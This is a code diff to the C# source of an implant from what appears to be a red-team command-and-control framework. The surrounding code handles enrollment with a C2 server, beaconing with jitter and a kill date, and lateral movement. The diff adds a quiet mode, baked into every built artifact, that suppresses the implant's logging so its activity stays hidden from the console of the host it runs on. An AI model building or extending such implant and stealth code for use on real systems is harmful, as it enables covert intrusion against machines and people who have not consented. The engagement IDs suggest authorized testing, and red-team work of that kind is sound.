@@ -51,9 +51,15 @@ internal static class ImplantApp
             return 1;
         }
 
+        // The narration log: stderr while developing, a null sink when quiet.
+        // Fatal paths below (refused enroll, dead beacon) print regardless --
+        // an implant that dies silently is undebuggable -- but the running
+        // implant's progress stays off the console of the host it runs on.
+        var log = config.Quiet ? TextWriter.Null : Console.Error;
+
         // The implant owns its private key; only the public half crosses enroll
         // (architecture.md Sec 9). 2048-bit RSA matches the dev CA's leaf key size.
-        Console.Error.WriteLine("rod-implant: generating implant keypair");
+        log.WriteLine("rod-implant: generating implant keypair");
         using var privateKey = RSA.Create(2048);
 
         var serverCAs = CACertLoader.LoadOptional(config.CACertPath);
@@ -68,14 +74,14 @@ internal static class ImplantApp
         Enrollment enrollment;
         try
         {
-            enrollment = await EnrollWithRetryAsync(egress, config, privateKey, serverCAs, cts.Token);
+            enrollment = await EnrollWithRetryAsync(egress, config, privateKey, serverCAs, log, cts.Token);
         }
         catch (Exception ex)
         {
             Console.Error.WriteLine($"rod-implant: enroll: {ex.Message}");
             return 1;
         }
-        Console.Error.WriteLine($"rod-implant: enrolled: implant={enrollment.ImplantId} engagement={enrollment.EngagementId}");
+        log.WriteLine($"rod-implant: enrolled: implant={enrollment.ImplantId} engagement={enrollment.EngagementId}");
 
         // The lateral.move handler re-enrolls a child against the same enroll path,
         // naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
@@ -96,7 +102,7 @@ internal static class ImplantApp
         var beacon = new Beacon(
             config.Mode, egress, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
             config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
-            config.ClassVerbs, Console.Error);
+            config.ClassVerbs, log);
         try
         {
             await beacon.RunAsync(cts.Token);
@@ -125,6 +131,7 @@ internal static class ImplantApp
         Config config,
         RSA privateKey,
         X509Certificate2Collection? serverCAs,
+        TextWriter log,
         CancellationToken cancellationToken)
     {
         const int maxAttempts = 5;
@@ -135,7 +142,7 @@ internal static class ImplantApp
             var enrollUrl = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport);
             try
             {
-                Console.Error.WriteLine($"rod-implant: enrolling at {enrollUrl}");
+                log.WriteLine($"rod-implant: enrolling at {enrollUrl}");
                 return await C2.EnrollAsync(
                     enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, cancellationToken: cancellationToken);
             }
@@ -151,7 +158,7 @@ internal static class ImplantApp
             {
                 if (attempt == maxAttempts)
                     throw;
-                Console.Error.WriteLine($"rod-implant: enroll attempt {attempt} failed: {ex.Message}; retrying");
+                log.WriteLine($"rod-implant: enroll attempt {attempt} failed: {ex.Message}; retrying");
                 egress.Advance();
                 try
                 {
@@ -241,6 +248,10 @@ internal static class BakedProfileSupport
         SetEnvIfPresent(root, "userAgent", "ROD_USER_AGENT");
         SetEnvIfPresent(root, "requestTimeout", "ROD_REQUEST_TIMEOUT");
         SetEnvIfPresent(root, "envelope", "ROD_ENVELOPE");
+        // The pipeline bakes quiet=true for every artifact; a debugging run
+        // presets ROD_QUIET=0 to override it (SetEnvIfPresent leaves an
+        // already-set variable untouched).
+        SetEnvIfPresent(root, "quiet", "ROD_QUIET");
         // Headers ride as a nested object; re-emit the raw JSON verbatim into
         // ROD_HEADERS, which config.Parse decodes back into the header map.
         if (root.TryGetProperty("headers", out var headers)
